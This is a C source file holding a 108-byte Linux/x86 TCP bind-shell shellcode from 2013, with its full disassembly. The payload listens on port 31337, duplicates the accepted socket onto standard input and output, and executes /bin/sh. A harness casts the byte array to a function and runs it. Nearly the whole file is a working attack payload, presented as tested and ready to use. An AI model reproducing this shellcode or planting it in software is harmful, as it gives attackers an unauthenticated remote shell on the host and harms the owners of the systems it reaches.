/*

Title   : tcpbindshell  (108 bytes)
Date    : 15 May 2013
Author  : Russell Willis <codinguy@gmail.com>
Testd on: Linux/x86 (SMP Debian 3.2.41-2 i686)

$ objdump -D tcpbindshell -M intel

tcpbindshell:     file format elf32-i386

Disassembly of section .text:

08048060 <_start>:
 8048060:   31 c0                   xor    eax,eax
 8048062:   31 db                   xor    ebx,ebx
 8048064:   31 c9                   xor    ecx,ecx
 8048066:   31 d2                   xor    edx,edx
 8048068:   b0 66                   mov    al,0x66
 804806a:   b3 01                   mov    bl,0x1
 804806c:   51                      push   ecx
 804806d:   6a 06                   push   0x6
 804806f:   6a 01                   push   0x1
 8048071:   6a 02                   push   0x2
 8048073:   89 e1                   mov    ecx,esp
 8048075:   cd 80                   int    0x80
 8048077:   89 c6                   mov    esi,eax
 8048079:   b0 66                   mov    al,0x66
 804807b:   b3 02                   mov    bl,0x2
 804807d:   52                      push   edx
 804807e:   66 68 7a 69             pushw  0x697a
 8048082:   66 53                   push   bx
 8048084:   89 e1                   mov    ecx,esp
 8048086:   6a 10                   push   0x10
 8048088:   51                      push   ecx
 8048089:   56                      push   esi
 804808a:   89 e1                   mov    ecx,esp
 804808c:   cd 80                   int    0x80
 804808e:   b0 66                   mov    al,0x66
 8048090:   b3 04                   mov    bl,0x4
 8048092:   6a 01                   push   0x1
 8048094:   56                      push   esi
 8048095:   89 e1                   mov    ecx,esp
 8048097:   cd 80                   int    0x80
 8048099:   b0 66                   mov    al,0x66
 804809b:   b3 05                   mov    bl,0x5
 804809d:   52                      push   edx
 804809e:   52                      push   edx
 804809f:   56                      push   esi
 80480a0:   89 e1                   mov    ecx,esp
 80480a2:   cd 80                   int    0x80
 80480a4:   89 c3                   mov    ebx,eax
 80480a6:   31 c9                   xor    ecx,ecx
 80480a8:   b1 03                   mov    cl,0x3
080480aa <dupfd>:
 80480aa:   fe c9                   dec    cl
 80480ac:   b0 3f                   mov    al,0x3f
 80480ae:   cd 80                   int    0x80
 80480b0:   75 f8                   jne    80480aa
 80480b2:   31 c0                   xor    eax,eax
 80480b4:   52                      push   edx
 80480b5:   68 6e 2f 73 68          push   0x68732f6e
 80480ba:   68 2f 2f 62 69          push   0x69622f2f
 80480bf:   89 e3                   mov    ebx,esp
 80480c1:   52                      push   edx
 80480c2:   53                      push   ebx
 80480c3:   89 e1                   mov    ecx,esp
 80480c5:   52                      push   edx
 80480c6:   89 e2                   mov    edx,esp
 80480c8:   b0 0b                   mov    al,0xb
 80480ca:   cd 80                   int    0x80
*/

#include <stdio.h>

/*
 Port High/Low bytes
 Current port 31337 (7a69)
*/
#define PORTHL "\x7a\x69"

unsigned char code[] =
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66"
"\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89"
"\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52"
"\x66\x68"PORTHL"\x66\x53\x89\xe1\x6a\x10"
"\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04"
"\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3"
"\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3"
"\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80"
"\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68"
"\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89"
"\xe1\x52\x89\xe2\xb0\x0b\xcd\x80";

main()
{
    printf("Shellcode Length: %d\n", sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
}